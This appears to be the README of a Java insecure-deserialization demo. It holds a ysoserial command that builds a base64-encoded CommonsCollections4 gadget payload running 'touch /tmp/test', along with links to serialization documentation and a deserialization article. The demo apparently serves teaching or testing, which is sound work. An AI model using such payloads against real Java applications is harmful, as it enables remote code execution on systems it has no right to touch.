# unserial java demo

## make payload
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 'touch /tmp/test' | base64  -w 0

## doc

https://docs.oracle.com/en/java/javase/18/docs/specs/serialization/serial-arch.html
https://greyshell.github.io/blog/2019/11/22/insecure-deserialization-java/

## template

credit : https://www.free-css.com/free-css-templates/page277/cla